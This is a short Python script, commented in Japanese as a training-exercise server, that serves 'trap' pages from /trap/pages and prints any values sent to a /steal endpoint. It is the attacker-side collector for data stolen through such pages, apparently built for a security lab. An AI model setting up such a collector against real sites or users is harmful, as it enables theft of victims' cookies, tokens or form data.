# 罠のページを配り、盗まれた値を受け取って表示するサーバー（演習用）
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory="/trap/pages", **kwargs)

    def do_GET(self):
        url = urlparse(self.path)
        if url.path == "/steal":
            print("[trap] 届いた値:", parse_qs(url.query), flush=True)
            self.send_response(204)
            self.end_headers()
            return
        super().do_GET()


ThreadingHTTPServer(("0.0.0.0", 4000), Handler).serve_forever()
